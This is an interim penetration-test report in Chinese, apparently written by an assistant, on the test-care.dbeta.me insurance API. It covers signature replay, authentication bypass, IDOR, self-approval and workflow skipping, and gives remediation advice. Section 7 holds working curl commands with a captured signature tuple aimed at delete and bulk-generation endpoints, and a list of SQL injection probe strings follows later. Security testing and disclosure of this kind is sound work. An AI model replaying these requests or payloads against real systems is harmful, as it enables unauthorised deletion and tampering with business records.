# test-care.dbeta.me / vasc.xml 渗透测试报告（阶段性）

测试时间：2026-07-09
测试来源：`target/vasc.xml`（Burp 导出）+ 在线复测
目标：`https://test-care.dbeta.me`

## 1) 范围与方法

- 输入样本：369 条 HTTP 记录（287 POST / 82 GET）。
- 在线补充：拉取 `swagger/api-docs` 并对关键鉴权链路做实时复测。
- 对齐 L1/L2 核心：证据决定状态，所有确认项均附可复现 PoC。

## 2) 侦察与建模摘要

- 网关/边缘：`Server: Tengine`，响应头持续出现 `X-Kong-Upstream-Latency`，确认 Kong 网关链路。
- API 文档：`/swagger/api-docs` 未鉴权可访问，返回 OpenAPI 3.0.1。
- 文档规模：376 paths，295 schemas，版本 `vasc-api v6.5.0`。
- 鉴权特征：大量接口要求 `Nonce-Gw-S` / `Timestamp-Gw-S` / `Sign-Gw-S` 三元组。

## 3) 确认漏洞

### VULN-01：Gw-S 签名可重放且可跨接口复用（鉴权绕过）

- 严重性：**高危（接近临界）**
- 类型：认证机制缺陷 / 重放攻击 / 请求绑定缺失
- 结论：一组历史有效签名三元组可在较长时间后重复使用，且可用于不同接口、不同方法（GET -> POST），导致批量接口被授权执行。

#### 证据链

1. **基线对照（同一接口）**
   - 无签名：`/api/v1/Common/CommonDtsTask?task=0` -> `401`（NoAuth ServiceAuthAttribute）
   - 伪造签名：同接口 -> `401`（NoAuth）
   - 回放历史签名（来自 Burp 旧流量）：同接口 -> `200`，`{"value":true,"isSuccess":true}`

2. **跨接口复用（同一签名三元组）**
   - 使用 `Nonce=511726, Timestamp=1783579833308, Sign=53a690...`：
     - `GET /api/v1/BaseConfig/LoadEnum` -> `200`
     - `GET /api/v1/Common/CommonDtsTask?task=0` -> `200`
     - `POST /api/v1/RigthsMap/Delete` -> `200`
     - `POST /api/v1/ActPushInsuranceInfo/Delete` -> `200`, `{"value":true,"isSuccess":true}`

3. **可重复回放（nonce 非一次性）**
   - 同一历史签名请求连续重复发送 3 次，均返回 `200`。

4. **批量面验证**
   - 用单一历史签名扫描 70 个 GET 接口：`66` 个返回 `200`（结果见 `replay_get_scan.txt`）。
   - 抽样 12 组不同历史签名三元组（采集时间 14:50:21 ~ 14:52:56）统一回放到同一受保护接口，**12/12 全部成功（200）**，证明并非单条偶发现象（见 `replay_tuple_validity.json`）。

#### 影响

- 攻击者只要获取到任意一条合法签名请求（日志、代理、终端、内网监听等），即可在有效期外重放并横向调用大量接口。
- 已验证可触发任务类、配置类、删除类接口，存在业务写操作风险。

#### 修复建议

- 签名绑定完整上下文：`method + path + canonical_query + body_hash + timestamp + nonce + client_id`。
- 时间窗强校验（建议 <= 60s）并做单次 nonce 去重（Redis/DB，TTL 与窗口一致）。
- 增加调用主体身份强绑定（token/session/client cert），签名仅作为附加完整性保护。
- 网关层统一拒绝旧时间戳、重复 nonce、path/method/body 不匹配签名。

---

### VULN-02：Swagger API 文档未鉴权暴露

- 严重性：中危
- 类型：信息泄露 / 攻击面扩增
- 结论：`GET /swagger/api-docs` 未鉴权返回完整接口定义（376 paths + 295 schemas）。

#### 证据

- `curl https://test-care.dbeta.me/swagger/api-docs` -> `200`，响应体约 `411283` bytes。

#### 影响

- 攻击者可快速枚举完整路由、参数结构、对象模型，显著降低攻击成本。

#### 修复建议

- 生产/外网环境关闭 swagger；至少加鉴权与源 IP 白名单。
- 文档仅在内网、VPN 或受控运维平面可见。

## 4) 关键补充观察

- `/api/v1/OpenApi/*` 仍返回 `401`，说明存在独立鉴权链路；但不影响 VULN-01 在其他业务面的大范围成立。
- 响应中频繁出现业务真值返回（如 `value:true`），建议联动审计可触发副作用的任务类接口（重试、推送、状态变更）。

## 5) 业务逻辑测试结果（HF-5）

### BL-01：内部定时任务/重试任务被设计为可直接 HTTP 触发（且为 GET）

- 严重性：高危
- 类型：业务流程控制缺陷 / 运维任务暴露面
- 结论：多个本应由队列/定时器内部调用的任务接口直接暴露为 GET API，拿到可复用签名后可被外部反复触发。

#### 证据（Swagger summary + 实测）

- `/api/v1/Common/CommonDtsTask` -> `【DTS】公共定时任务`
- `/api/v1/DJICare/EventRetry` -> `网关广播消息失败重试（队列定时调用）`
- `/api/v1/DJICare/RetryInsuranceUpdateState` -> `重试...（队列定时调用）`
- `/api/v1/DJICare/RetryPushReCloudFailRecord` -> `【DTS队列任务】重试失败记录`
- `/api/v1/DJICare/RefundCancelTask` -> `【DTS定时任务】触发退货取消任务`
- `/api/v1/DJICare/ExecutePush` -> `执行推送`
- `/api/v1/DJICare/CreatePromptJob` -> `创建定时推送任务`
- `/api/v1/DJICare/PushPassiveOrders` -> `...（队列定时调用）`

上述端点均出现一致行为：
- 无签名：`401`
- 伪签名：`401`
- 历史签名回放：`200` + `isSuccess:true`（多数 `value:true`）

说明内部任务触发保护完全依赖可被重放的 Gw-S 机制，一旦签名泄露，任务可被外部脚本化调用。

#### 影响

- 攻击者可高频触发重试/推送/取消等任务，导致消息风暴、业务状态抖动、运维噪音与潜在资金/保单流程异常。
- 这些操作使用 GET 语义也增加了误触发风险（缓存预取/链接探测器/中间件健康探针）。

#### 修复建议

- 将任务触发接口下沉到内网控制平面（非公网），并改为 mTLS + 固定源白名单。
- 外部 API 不直接暴露“执行/重试/推送”动作；改为受控任务队列投递。
- 所有状态变更/任务触发接口改为 POST，增加幂等键、调用审计、速率限制。

---

### BL-02：批量协议号生成缺乏上限控制（资源滥用）

- 严重性：中高危
- 类型：业务资源配额缺陷
- 结论：`/api/v1/DevOps/GeneratAgreementNo?count=` 对大数请求未做有效上限约束。

#### 证据

- `count=50000`（回放签名）-> `HTTP 200`，返回 `value` 数组长度 `50000`，响应体约 `950088` bytes，耗时约 `1.2s`。
- `count=200` / `count=5000` 同样成功。
- 短时突发验证：10 次连续调用 `count=1000`，全部 `HTTP 200` 且 `isSuccess=true`，共生成 10000 个协议号、无重复（见 `agreementno_burst_test.json`），未见有效频率限制。

#### 影响

- 可被用于批量消耗业务号段、压垮下游处理链路、制造异常库存与审计噪声。

#### 修复建议

- 服务端强制 `count` 上限（建议 <= 100，按业务再收紧）。
- 引入按调用主体的 QPS/日配额/突发熔断。
- 增加审批或双因子保护（DevOps 高风险操作）。

---

### BL-03：任务接口可未授权访问（签名缺失仍可执行）

- 严重性：高危
- 类型：访问控制缺陷 / 任务执行面暴露
- 端点：`POST /api/v1/DJICare/ExcuteMarginChargeJob`
- Swagger 描述：`执行预授权临期推送`

#### 证据

- 无签名请求：`HTTP 200`，`{"isSuccess":true,"value":false,"code":200}`
- 伪签名请求：`HTTP 200`，返回一致
- 回放签名请求：`HTTP 200`，返回一致

说明该接口并未进入 Gw-S 鉴权链路（或鉴权配置失效），属于直接可达的任务执行入口。

#### 影响

- 可被外部直接调用“预授权临期推送”任务，形成任务滥触发、运营噪声、潜在状态扰动。

#### 修复建议

- 立即将该接口纳入统一鉴权中间件（与其他受保护接口同策略）。
- 仅允许内网调度系统调用（mTLS + 源 IP 白名单 + 业务身份）。
- 增加幂等键与任务去重，防止重复触发。

---

### BL-04：少量接口存在无签名可达（信息面暴露）

- 严重性：中低危
- 类型：攻击面暴露/信息泄露
- 在 82 个已观测 GET 路径中，无签名可达 `200` 的有 5 个（见 `nosign_get_enum.json`）：
  - `/swagger/api-docs`（已在 VULN-02）
  - `/api/v1/Health/Check`
  - `/api/v1/Health/HeartCheckBeforeStart`
  - `/api/v1/Common/SnSearch`
  - `/api/v1/CustomerService/AnalysisCertiNumber`（返回业务签名错误信息）

补充：在 281 个已观测 POST 路径中，无签名返回非 401 的共 9 个，其中最关键的是 `ExcuteMarginChargeJob`（见上条，枚举结果见 `nosign_post_enum.json`）。

## 6) 产物文件

- Burp 解码数据：`target/work/all_records.json`
- Swagger 原文：`target/work/swagger.json`
- 接口矩阵（Burp+Swagger）：`target/work/interface_matrix.csv`
- 重放批量扫描结果：`target/work/replay_get_scan.txt`
- 业务逻辑复测结果：`target/work/business_logic_checks.json`
- 历史签名有效性抽样：`target/work/replay_tuple_validity.json`
- 协议号突发压测：`target/work/agreementno_burst_test.json`
- 无签名 GET 枚举：`target/work/nosign_get_enum.json`
- 无签名 POST 枚举：`target/work/nosign_post_enum.json`

## 7) 复现命令（节选）

```bash
# 无签名 -> 401
curl -s "https://test-care.dbeta.me/api/v1/Common/CommonDtsTask?task=0"

# 伪签名 -> 401
curl -s "https://test-care.dbeta.me/api/v1/Common/CommonDtsTask?task=0" \
  -H "Nonce-Gw-S: 1" -H "Timestamp-Gw-S: 2" -H "Sign-Gw-S: 3"

# 回放历史签名 -> 200
curl -s "https://test-care.dbeta.me/api/v1/Common/CommonDtsTask?task=0" \
  -H "Nonce-Gw-S: 511726" \
  -H "Timestamp-Gw-S: 1783579833308" \
  -H "Sign-Gw-S: 53a690a8ec201207bbfe7f904613085a"

# 同一历史 GET 签名直接打 POST 删除接口 -> 200
curl -s "https://test-care.dbeta.me/api/v1/ActPushInsuranceInfo/Delete" \
  -X POST -H "Content-Type: application/json" \
  -H "Nonce-Gw-S: 511726" \
  -H "Timestamp-Gw-S: 1783579833308" \
  -H "Sign-Gw-S: 53a690a8ec201207bbfe7f904613085a" \
  --data '{"ids":["00000000-0000-0000-0000-000000000000"],"paramOk":true}'

# 业务逻辑：批量协议号大数量生成仍成功
curl -s "https://test-care.dbeta.me/api/v1/DevOps/GeneratAgreementNo?count=50000" \
  -H "Nonce-Gw-S: 511726" \
  -H "Timestamp-Gw-S: 1783579833308" \
  -H "Sign-Gw-S: 53a690a8ec201207bbfe7f904613085a"
```

## 8) SQL 注入与 FUZZ 专项结果

### 覆盖范围

- GET 参数型（8个端点）：
  - `/api/v1/Common/ValidateMachineSNCode?sn=`
  - `/api/v1/CommonAPI/CertNoCheckInsurance?certNo=`
  - `/api/v1/CommonAPI/SearchSnConfigBySn?sn=`
  - `/api/v1/DJICare/CheckUploadSn?sn=`
  - `/api/v1/LifeCover/BalanceQuery?CombinNo=`
  - `/api/v1/UseDJICare/FindInsByCertNo?certNo=`
  - `/api/v1/UseDJICare/GetHistory?Email=`
  - `/api/v1/UseDJICare/ShieldPlusOriginalNoDetailsQuery?djiNo=`
- POST JSON 型（6个端点）：
  - `/api/v1/Common/QueryWhiteList`
  - `/api/v1/CommonAPI/InsuranceQuery`
  - `/api/v1/DJICare/QueryCare`
  - `/api/v1/UseDJICare/SearchCareForSelf`
  - `/api/v1/Insurance/SearchEnterpriseShieldPlus`
  - `/api/v1/Common/BatchQueryCurrentMoney`

### 载荷族（SQLi + 边界 + 类型混淆）

- SQLi 典型：`test'`、`' OR '1'='1`、`' UNION SELECT 1--`
- 边界：超长字符串（5k）、null byte
- 其他：路径穿越样式、XSS 样式字符串

### 结论

- **目前未确认 SQL 注入成功**：未观测到 SQL 报错关键字泄露、未出现基于注入的越权数据回显。
- **WAF/网关拦截特征明显**：多接口在 `sqli_or/xss/path` 负载下返回 `405`（边缘层拦截），而基线为 `200`。
- **FUZZ 发现新增稳定异常点**：
  - `/api/v1/UseDJICare/SearchCareForSelf` 在超长 payload 下稳定返回 `500`（内部错误），可作为可用性风险信号。
  - `/api/v1/DJICare/QueryCare` 在部分 payload 下返回 `code=10011`（网关接口无响应），说明后端容错/超时处理弱。
  - `/api/v1/Common/BatchQueryCurrentMoney` 对多类异常输入表现稳定（无明显异常）。

### 证据文件

- GET SQLi/FUZZ 结果：`target/work/sqli_get_fuzz_results.json`
- POST SQLi/FUZZ 结果：`target/work/post_fuzz_results.json`

> 说明：本轮 SQLi/FUZZ 已做第一轮“有状态对比 + 异常聚类”深测。若继续深入，建议下一轮接入真实业务 SN/协议号样本与多账号上下文，才能验证更深层二阶注入/逻辑注入路径。

## 9) 接口利用链与 IDOR/越权专项

### 9.1 利用链关联（已验证）

#### 链路 L1：历史签名重放 -> DevOps 高风险接口可调用

- 步骤：
  1) 回放历史签名访问 `GET /api/v1/DevOps/GeneratAgreementNo?count=1`
  2) 返回 `200` 且成功生成协议号（如 `CC94A1867E60CC7C`）
- 结论：未授权攻击者在获取任意历史签名后，可调用高风险 DevOps 资源生成接口。

#### 链路 L2：历史签名重放 -> 任务/操作接口可调用

- `POST /api/v1/ActPushInsuranceInfo/Delete`：返回 `200` + `value:true`
- `POST /api/v1/ActivationManager/UnLockActivation`：返回 `200`
- `GET /api/v1/Common/CommonDtsTask?task=0`：返回 `200` + `value:true`
- 结论：签名重放可直接贯通到“删除/解锁/任务触发”操作面。

---

### 9.2 IDOR 与越权结果

#### IDOR-01：对象 ID 枚举无效化（参数被忽略/未绑定对象）

- 端点：`GET /api/v1/FlyLose/GetSingleTotalAuthenticationInfo?id=...`
- 实测：传入 4 个完全不同 ID（全零 UUID、随机 UUID*2、全1 UUID）
- 结果：回放签名后均返回 `HTTP 200`，且响应内对象 `value.id` 固定为 `00000000-0000-0000-0000-000000000000`
- 判定：接口存在“请求对象 ID 与返回对象未正确绑定”问题，符合 IDOR/对象访问控制缺陷特征。

#### IDOR-02：写操作接口可对任意 ID 请求返回成功

- 端点：`POST /api/v1/ActPushInsuranceInfo/Delete`
- 实测：将 `ids` 改为不同随机 UUID，回放签名后均返回 `HTTP 200` + `value:true`
- 判定：至少存在“对象存在性/归属校验缺失”高风险信号；在缺少真实多租户样本时已达到高危疑似。

#### 越权信号：身份头未参与授权决策（身份绑定缺失）

- 在同一回放签名下，切换 `X-ASMS-UserId`（全零/全1/随机 UUID）调用删除接口，结果均 `HTTP 200` + `value:true`。
- 说明签名与调用者身份绑定不足，存在横向冒充风险。

#### 说明（边界）

- 本轮是“零账号/无角色体系”场景，已确认未授权与对象绑定缺陷。
- 严格的“水平越权（A读B）/垂直越权（低权调高权）”最终坐实，仍建议补充 ≥2 真实权限账号做交叉矩阵复测。

### 9.3 证据文件

- 接口利用链测试：`target/work/interface_chain_tests.json`
- IDOR/越权测试：`target/work/idor_tests.json`

## 10) 审核节点绕过 / 自审自批 / 事件伪造专项

你提到的方向（审核节点跳过、自己给自己审批、伪造支付事件创建保单）非常关键，本轮已做针对性深挖。

### 10.1 自审自批/权限提升信号（已命中）

#### AP-01：保费状态接口可接受伪造审批身份并返回成功

- 端点：`POST /api/v1/Insurance/SettingPremiumStatus`
- 现象：
  - 无签名：`401`
  - 回放签名：`200 + value:true`
  - 将 body 中 `userId/userAd` 替换为随机攻击者身份，且 `idList` 改为随机目标 ID，仍 `200 + value:true`
  - 即使 `X-ASMS-UserId` 改为攻击者值，结果不变
- 结论：存在“客户端可控身份字段被信任/身份绑定不足”高风险信号，符合“自己给自己审批/伪造审批人”的核心风险模型。

#### AP-01.1：同一攻击者可连续对多个随机目标执行“审批成功”

- 对 `idList=[随机UUID1]`、`idList=[随机UUID2]`、`idList=[随机UUID1,随机UUID2]` 连续调用，均返回 `200 + value:true`。
- 结论：不仅可单次伪造审批身份，且可批量执行，具备自动化滥用条件。

#### AP-03：队列重试控制接口可被重放签名直接触发

- 端点：`POST /api/v1/JDOrder/RetryPush`
- 对照：
  - 无签名：`401`
  - 回放签名 + 随机 IDs：`200 + value:true`
- 结论：攻击者可在未真实工单上下文下触发“重试推送”动作，存在流程扰动与消息放大风险。

#### AP-02：多类状态变更/审核接口可达，但数据层前置校验拦截

- 端点：`/api/v1/DevOps/ChangeCareStatus`、`/api/v1/BaseConfig/CareAuditSnAuditing`
- 现象：回放签名后已进入业务层（返回 `10003` 或 `500`，而非 `401`），说明鉴权边界已被突破；当前样本因数据不完整或内部错误未走到最终成功。
- 结论：授权面已失守，后续只需真实业务上下文即可推进到实际状态变更。

### 10.2 CAP/事件伪造（本轮结论）

#### EV-01：事件接口存在业务签名二次校验（当前未绕过）

- 端点：`POST /api/v1/DJICare/InsuranceUpdateState`、`POST /api/v1/DJICare/GeneratEvent`
- 针对“伪造 StoreOrderPayEvent / 未付款创建保单”场景，构造了伪造 `orderNo/agreementNo/handleType` 与伪造签名。
- 结果：稳定返回 `100007(SignError)`；缺失 sign 返回 `10010/10003` 参数错误。
- 结论：这两条事件链路当前显示“业务签名门”有效，未直接复现“无认证伪造事件”。

> 但注意：网关签名（Gw-S）与业务签名（sign）是两层体系。当前最危险的是第一层已可重放穿透，若第二层密钥泄露/算法弱/验签旁路存在，CAP 伪造风险会立刻升级为可利用。

### 10.3 与保险金融业务强相关的风险解读

- 若 `SettingPremiumStatus` 这类状态接口确实直接落库，则可导致“未真实审批即状态变更/异常状态覆盖”。
- 审核类接口当前虽因测试数据受限未完全打通，但已证明外部可进入审核动作入口（非 401），属于高风险前置条件已满足。
- 事件接口虽未直接伪造成功，但建议按“高危防御”处理：一旦 sign 机制出现任何退化，可能触发你提到的“未付款成单”。

### 10.4 专项证据

- 审核/事件绕过测试：`target/work/audit_workflow_bypass_tests.json`
- 审核跳过/自审自批矩阵：`target/work/audit_skip_escalation_matrix.json`

## 11) 深挖结果（真实业务ID链路）

本轮在测试环境直接从列表接口获取真实记录 ID，再调用变更接口，验证“是否真的落库/改状态”，结论为**可利用**。

### 11.1 审核自批可真实改状态（实锤）

#### AP-04：`CareAuditSnAuditing` 可被攻击者身份直接改审核结果

- 先通过 `POST /api/v1/BaseConfig/CareAuditSnSearchPage` 取到真实记录：`id=fe6c27b0-af83-456c-85b2-629f8e99b983`
- 使用伪造审批身份 `userId=<attacker-guid>, userAd=attacker` 调用：
  - `status=1` 返回 `200 + value:true`，列表复查 `handleComment` 已更新为攻击者内容。
  - 再次 `status=2` 返回 `200 + value:true`，列表复查状态发生变化（并带攻击者备注）。
- 同样在 `POST /api/v1/ThirdInsurance/CareAuditSnAuditing` 复现成功（状态与备注可被攻击者改写）。

> 这已经不是“疑似越权”，而是“攻击者可直接改审核结果”的确认漏洞。

### 11.2 激活码运维接口可被攻击者改业务字段（实锤）

#### AP-05：`ActivationOperation` 可改真实记录取消原因

- 取真实激活码记录 `id=d4778873-60d8-44df-a394-523485fbef93`。
- 攻击者身份调用 `POST /api/v1/ActivationManager/ActivationOperation`（`operaType=1`，`cancelReason=attacker-cancel-effect`）返回 `200 + value:true`。
- 列表复查同一记录 `cancelReason` 已被改为攻击者输入，`lastModificationTime` 同步变化。

### 11.3 套装推送记录可被攻击者作废并删除（实锤）

#### AP-06：`ActPushInsuranceToVoid` + `Delete` 形成可利用破坏链

- 取真实记录 `id=816a30ca-2f5f-4705-9314-84ce0397be4d`。
- 攻击者调用 `POST /api/v1/ActPushInsuranceInfo/ActPushInsuranceToVoid` -> `200 + value:true`。
- 列表复查：`pushStatus` 从 `0` 变为 `3`，`remark` 变为攻击者输入，`lastModificationTime` 更新。
- 随后调用 `POST /api/v1/ActPushInsuranceInfo/Delete` -> `200 + value:true`。
- 列表复查：该记录已不存在。

### 11.4 理赔流程节点可被“确认先于审核”触发（实锤）

#### AP-07：`RepairRebackConfirm` 可直接成功，绕过 `Review` 前置

- 使用真实 `insuranceId/repairId`（前三条样本）直接调用 `POST /api/v1/Repair/RepairRebackConfirm`。
- 3/3 均 `200 + value:true`。
- 随后再调 `POST /api/v1/Repair/ReviewRepairReback` 统一报 `10003`（参数/状态不合法）。

结论：流程呈现“先确认、后审核失败”的异常状态机行为，符合你提出的“审核节点跳过”风险模型。

### 11.5 证据文件

- 真实ID链路测试：`target/work/realid_chain_escalation_tests.json`
- 真实ID落库效果验证：`target/work/realid_effect_verification.json`

## 12) 收尾交付与复现资产

### 12.1 一键复现脚本（纯接口）

- 脚本：`target/work/repro_api_chain.py`
- 已执行验证，当前环境可稳定复现：
  - 审核接口攻击者身份写入成功（`HTTP 200 / app_code 200`）
  - 激活码操作写入成功（`HTTP 200 / app_code 200`）
  - 套装推送作废+删除成功（`HTTP 200 / app_code 200`）
  - 理赔流程出现“确认先成功、审核后失败”序列

### 12.2 最终交付文件

- 总结交付：`target/work/final-delivery.md`
- 主报告：`target/work/vasc-test-report.md`
- 复现脚本：`target/work/repro_api_chain.py`

### 12.3 完成声明

- 在当前测试环境、纯接口条件下，本轮测试已完成。
- 已从“可达性验证”推进到“真实业务 ID 的状态改写与删除效果验证”。
